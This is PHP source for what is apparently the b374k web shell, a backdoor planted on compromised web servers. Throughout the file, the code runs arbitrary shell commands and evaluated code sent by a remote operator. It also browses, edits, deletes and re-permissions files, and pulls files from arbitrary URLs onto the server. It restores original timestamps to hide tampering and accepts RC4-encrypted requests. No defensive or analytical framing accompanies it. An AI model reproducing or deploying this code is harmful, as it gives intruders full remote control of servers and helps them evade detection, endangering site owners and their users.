<?php

block_bot();
auth();
chdir(get_cwd());
$nav = get_nav(get_cwd());
$p = array_map("to_encode", get_post());
$cwd = html_safe(get_cwd());
$GLOBALS['module'] = array();

$explorer_content = "";
if(isset($p['viewEntry'])){
	$path = trim($p['viewEntry']);
	if(is_file($path)){
		$dirname = realpath(dirname($path)).DIRECTORY_SEPARATOR;
		setcookie("cwd", encode_cwd($dirname));
		chdir($dirname);
		$nav = get_nav($dirname);
		$cwd = html_safe($dirname);
		$explorer_content = view_file($path, "auto");
	}elseif(is_dir($path)){
		$path = realpath($path).DIRECTORY_SEPARATOR;
		setcookie("cwd", encode_cwd($path));
		chdir($path);
		$nav = get_nav($path);
		$cwd = html_safe($path);
		$explorer_content = show_all_files($path);
	}
}
else $explorer_content = show_all_files(get_cwd());

$nav = from_encode($nav);
$cwd = from_encode($cwd);
$explorer_content = from_encode($explorer_content);

$GLOBALS['module']['explorer']['id'] = "explorer";
$GLOBALS['module']['explorer']['title'] = "Explorer";
$GLOBALS['module']['explorer']['js_ontabselected'] = "";
$GLOBALS['module']['explorer']['content'] = $explorer_content;

$GLOBALS['module']['terminal']['id'] = "terminal";
$GLOBALS['module']['terminal']['title'] = "Terminal";
$GLOBALS['module']['terminal']['js_ontabselected'] = "
if(!portableMode) $('#terminalInput').focus();";
$prompt = "";
if (function_exists('posix_getpwuid')) {
    $user = posix_getpwuid(posix_geteuid())['name'];
    $hostname = gethostname();
    if(!$hostname) {
        $hostname = isset($_SERVER['SERVER_ADDR'])? $_SERVER['SERVER_ADDR']:isset($_SERVER["SERVER_NAME"])?$_SERVER["SERVER_NAME"]:"localhost";
    } else {
        $hostname = pathinfo($hostname, PATHINFO_FILENAME);
    }
    $prompt = "<span class='strong' id='prompt_part'>".$user."@".$hostname.":</span>";
}
$GLOBALS['module']['terminal']['content'] = "<pre id='terminalOutput'></pre><table id='terminalPrompt'><tr><td class='colFit'>".$prompt."<span id='terminalCwd' class='strong'>".$cwd."&gt;</span></td><td id='terminalCommand'><input type='text' id='terminalInput' class='floatLeft' spellcheck='false'></td></tr></table>";


$GLOBALS['module']['eval']['id'] = "eval";
$GLOBALS['module']['eval']['title'] = "Eval";
$GLOBALS['module']['eval']['js_ontabselected'] = "
if(!portableMode) $('#evalInput').focus();";
$GLOBALS['module']['eval']['content'] = "
<table class='boxtbl'>
<thead>
	<tr><th colspan='4'><p class='boxtitle'>Eval</p></th></tr>
</thead>
<tbody>
	<tr><td colspan='4'><textarea id='evalInput' spellcheck='false' style='height:140px;min-height:140px;'></textarea></td></tr>
	
	<tr id='evalAdditional'><td colspan='4'>
		<input type='text' id='evalOptions' value='Options/Switches' spellcheck='false' onkeydown=\"trap_enter(event, 'eval_go');\">
		<input type='text' id='evalArguments' value='Arguments' spellcheck='false' onkeydown=\"trap_enter(event, 'eval_go');\">
	</td></tr>
	
	<tr>
		<td style='width:144px;'>
			<select id='evalType'>
				
			</select>
		</td>
		<td colspan='3'>
			<span id='evalSubmit' style='width:120px;' class='button' onclick=\"eval_go();\">run</span>	
		</td>
	</tr>
	
	<tr><td colspan='4'><pre id='evalOutput'>You can also press ctrl+enter to submit</pre></td></tr>
</tbody>
</table>
";

$res = "";
if(isset($p['cd'])){
	$path = $p['cd'];
	if(trim($path)=='') $path = dirname(__FILE__);

	$path = realpath($path);
	if(is_file($path)) $path = dirname($path);
	if(is_dir($path)){
		chdir($path);
		$path = $path.DIRECTORY_SEPARATOR;
		setcookie("cwd", encode_cwd($path));
		$res = $path."{[|b374k|]}".get_nav($path)."{[|b374k|]}";
		if(isset($p['showfiles'])&&($p['showfiles']=='true')){
			$res .= show_all_files($path);
		}
	}else $res = "error";
	output($res);
}
elseif(isset($p['viewFile']) && isset($p['viewType'])){
	$path = trim($p['viewFile']);
	$type = trim($p['viewType']);
	$preserveTimestamp = trim($p['preserveTimestamp']);
	if(is_file($path)){
		$res = view_file($path, $type, $preserveTimestamp);
	}
	else $res = "error";
	output($res);
}
elseif(isset($p['renameFile']) && isset($p['renameFileTo'])){
	$renameFile = trim($p['renameFile']);
	$renameFileTo = trim($p['renameFileTo']);
	if(file_exists($renameFile)){
		if(rename($renameFile, $renameFileTo)){
			$res = dirname($renameFileTo);
		}
		else $res = "error";
	}
	else $res = "error";
	output($res);
}
elseif(isset($p['newFolder'])){
	$newFolder = trim($p['newFolder']);
	if(mkdir($newFolder)){
		$res = dirname($newFolder);
	}
	else $res = "error";
	output($res);
}
elseif(isset($p['newFile'])){
	$newFile = trim($p['newFile']);
	if(touch($newFile)){
		$res = dirname($newFile);
	}
	else $res = "error";
	output($res);
}
elseif(isset($p['delete'])){
	$path = trim($p['delete']);
	$dirname = dirname($path);
	if(is_file($path)){
		if(unlink($path)) $res = $dirname;
	}elseif(is_dir($path)){
		if(rmdirs($path)>0) $res = $dirname;
	}else $res = "error";
	if(file_exists($path)) $res = "error";
	output($res);
}
elseif(isset($p['editType'])&&isset($p['editFilename'])&&isset($p['editInput'])&&isset($p['preserveTimestamp'])){
	$editFilename = trim($p['editFilename']);
	$editInput = $p['editInput'];
	$editType = trim($p['editType']);
	$preserveTimestamp = trim($p['preserveTimestamp']);
	$time = filemtime($editFilename);
	if($editType=='hex') $editInput = pack("H*" , preg_replace("/\s/","", $editInput));
	if(write_file($editFilename, $editInput)){
		$res = $editFilename;
		if($preserveTimestamp=='true') touch($editFilename, $time);
	}
	else $res = "error";
	output($res);
}
elseif(isset($p['findType'])){
	$findType = trim($p['findType']);
	$findPath = trim($p['findPath']);
	$findName = trim($p['findName']);
	$findNameRegex = trim($p['findNameRegex']);
	$findNameInsensitive = trim($p['findNameInsensitive']);
	$findContent = trim($p['findContent']);
	$findContentRegex = trim($p['findContentRegex']);
	$findContentInsensitive = trim($p['findContentInsensitive']);
	$findReadable = trim($p['findReadable']);
	$findWritable = trim($p['findWritable']);
	$findExecutable = trim($p['findExecutable']);

	$candidate = get_all_files($findPath);
	if($findType=='file') $candidate = array_filter($candidate, "is_file");
	elseif($findType=='folder') $candidate = array_filter($candidate, "is_dir");
	else $res = "error";

	foreach($candidate as $k){
		if(($findType=="file")||($findType=="folder")){
			if(!empty($findName)){
				if($findNameRegex=="true"){
					$case = ($findNameInsensitive=="true")? "i":"";
					if(!preg_match("/".$findName."/".$case, basename($k))){
						$candidate = array_diff($candidate, array($k));
					}
				}
				else{
					$check = false;
					if($findNameInsensitive=="true"){
						$check = strpos(strtolower(basename($k)), strtolower($findName))===false;
					}
					else{
						$check = strpos(basename($k), $findName)===false;
					}

					if($check){
						$candidate = array_diff($candidate, array($k));
					}
				}
			}
		}
		if($findType=="file"){
			if(!empty($findContent)){
				$content = read_file($k);
				if($findContentRegex=="true"){
					$case = ($findContentInsensitive=="true")? "i":"";
					if(!preg_match("/".$findContent."/".$case, $content)){
						$candidate = array_diff($candidate, array($k));
					}
				}
				else{
					$check = false;
					if($findContentInsensitive=="true"){
						$check = strpos(strtolower($content), strtolower($findContent))===false;
					}
					else{
						$check = strpos($content, $findContent)===false;
					}
					if($check){
						$candidate = array_diff($candidate, array($k));
					}
				}
			}
		}
	}

	foreach($candidate as $k){
		if($findReadable=="true"){
			if(!is_readable($k)) $candidate = array_diff($candidate, array($k));
		}
		if($findWritable=="true"){
			if(!is_writable($k)) $candidate = array_diff($candidate, array($k));
		}
		if($findExecutable=="true"){
			if(!is_executable($k)) $candidate = array_diff($candidate, array($k));
		}
	}

	if(count($candidate)>0){
		$res = "";
		foreach($candidate as $k){
			$res .= "<p><span class='strong'>&gt;</span>&nbsp;<a data-path='".html_safe($k)."' onclick='view_entry(this);'>".html_safe($k)."</a></p>";
		}
	}
	else $res = "";
	output($res);
}
elseif(isset($p['ulType'])){
	$ulSaveTo = trim($p['ulSaveTo']);
	$ulFilename = trim($p['ulFilename']);

	if($p['ulType']=='comp'){
		$ulFile = $_FILES['ulFile'];
		if(empty($ulFilename)) $ulFilename = $ulFile['name'];

		if(is_uploaded_file($ulFile['tmp_name'])){
			if(!is_dir($ulSaveTo)) mkdir($ulSaveTo);
            $time = filemtime($ulSaveTo);
			$newfile = realpath($ulSaveTo).DIRECTORY_SEPARATOR.$ulFilename;
			if(move_uploaded_file($ulFile['tmp_name'], $newfile)){
                touch($newfile, $time);
				$res = "<span class='strong'>&gt;</span>&nbsp;<a data-path='".html_safe($newfile)."' onclick='view_entry(this);'>".html_safe($newfile)."</a>&nbsp;( 100% )";
			}
			else $res = "error";
		}
		else $res = "error";
	}
	elseif($p['ulType']=='url'){
		$ulFile = trim($p['ulFile']);
		if(empty($ulFilename)) $ulFilename = basename($ulFile);
		if(!is_dir($ulSaveTo)) mkdir($ulSaveTo);
        $time = filemtime($ulSaveTo);
		$newfile = realpath($ulSaveTo).DIRECTORY_SEPARATOR.$ulFilename;

		if(download($ulFile, $newfile)){
		    touch($newfile, $time);
			$res = "<span class='strong'>&gt;</span>&nbsp;<a data-path='".html_safe($newfile)."' onclick='view_entry(this);'>".html_safe($newfile)."</a>&nbsp;( 100% )";
		}
		else $res = "error";
	}
	else $res = "error";
	output($res);
}
elseif(isset($p['df_token'])){
	$file = to_encode(rawurldecode(hex2bin(trim($p['df_token']))));
	if(is_file($file)){
		download_file($file);
		die();
	}
}
elseif(isset($p['multimedia'])){
	$file = trim($p['multimedia']);
	$mime_list = get_resource('mime');
	$mime = "";
	$file_ext_pos = strrpos($file, ".");
	if($file_ext_pos!==false){
		$file_ext = trim(substr($file, $file_ext_pos),".");
		if(preg_match("/([^\s]+)\ .*\b".$file_ext."\b.*/i", $mime_list, $res)){
			$mime = $res[1];
		}
	}

	if(is_file($file)){
		header("Content-Type: ".$mime);
		header('Content-Transfer-Encoding: binary');
		header("Content-length: ".filesize($file));
		echo "data:".$mime.";base64,".base64_encode(read_file($file));
		die();
	}
}
elseif(isset($p['dz_token'])){
    $dz_token = trim($p['dz_token']);
    $post_str = rc4($GLOBALS['cipher_key'], hex2bin($dz_token));
    parse_str($post_str, $post);
    $post = fix_magic_quote($post);
    $p = array_map("to_encode", $post);

    $massType = trim($p['massType']);
    $massBuffer = trim($p['massBuffer']);
    $massValue = trim($p['massValue']);
    $massBufferArr = explode("\n", $massBuffer);

    $tmpdir = get_writabledir();
    $file = $tmpdir.$massValue;
    if(compress($massType, $file, $massBufferArr)){
        download_file($file);
    }
    @unlink($file);
    die();
}
elseif(isset($p['massType'])&&isset($p['massBuffer'])&&isset($p['massPath'])&&isset($p['massValue'])){
	$massType = trim($p['massType']);
	$massBuffer = trim($p['massBuffer']);
	$massPath = realpath($p['massPath']).DIRECTORY_SEPARATOR;
	$massValue = trim($p['massValue']);
	$counter = 0;

	$massBufferArr = explode("\n", $massBuffer);
	if(($massType=='tar')||($massType=='targz')||($massType=='zip')){
		if(compress($massType, $massValue, $massBufferArr)){
			$counter++;
			return $counter;
		}
	}else{
		foreach($massBufferArr as $k){
			$path = trim($k);
			if(file_exists($path)){
				$preserveTimestamp = filemtime($path);
				if($massType=='delete'){
					if(is_file($path)){
						if(unlink($path)) $counter++;
					}
					elseif(is_dir($path)){
						if(rmdirs($path)>0) $counter++;
					}
				}
				elseif($massType=='cut'){
					$dest = $massPath.basename($path);
					if(rename($path, $dest)){
						$counter++;
						touch($dest, $preserveTimestamp);
					}
				}
				elseif($massType=='copy'){
					$dest = $massPath.basename($path);
					if(is_dir($path)){
						if(copys($path, $dest)>0) $counter++;
					}
					elseif(is_file($path)){
						if(copy($path, $dest)) $counter++;
					}
				}
				elseif(($massType=='untar')||($massType=='untargz')||($massType=='unzip')){
					if(decompress($massType, $path, $massValue)){
						$counter++;
						return $counter;
					}
				}
				elseif(!empty($massValue)){
					if($massType=='chmod'){
						if(chmod($path, octdec($massValue))) $counter++;
					}
					elseif($massType=='chown'){
						if(chown($path, $massValue)) $counter++;
					}
					elseif($massType=='touch'){
						if(touch($path, strtotime($massValue))) $counter++;
					}
				}
			}
		}
	}
	if($counter>0) output($counter);
	output('error');
}
elseif(isset($p['viewFileorFolder'])){
	$entry = $p['viewFileorFolder'];
	if(is_file($entry)) output('file');
	elseif(is_dir($entry)) output('folder');
	output('error');
}
elseif(isset($p['terminalInput'])){
	output(html_safe(execute($p['terminalInput'])));
}
elseif(isset($p['evalInput']) && isset($p['evalType'])){
	$evalInput = $p['evalInput'];
	$evalOptions = (isset($p['evalOptions']))? $p['evalOptions']:"";
	$evalArguments = (isset($p['evalArguments']))? $p['evalArguments']:"";
	$evalType = $p['evalType'];

	error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
	@ini_set('html_errors','0');
	@ini_set('display_errors','1');
	@ini_set('display_startup_errors','1');

	$res = eval_go($evalType, $evalInput, $evalOptions, $evalArguments);
	if($res===false) $res = "error";
	output(html_safe($res));
}
elseif(isset($p['evalGetSupported'])){
	$res = eval_get_supported();
	output($res);
}
?>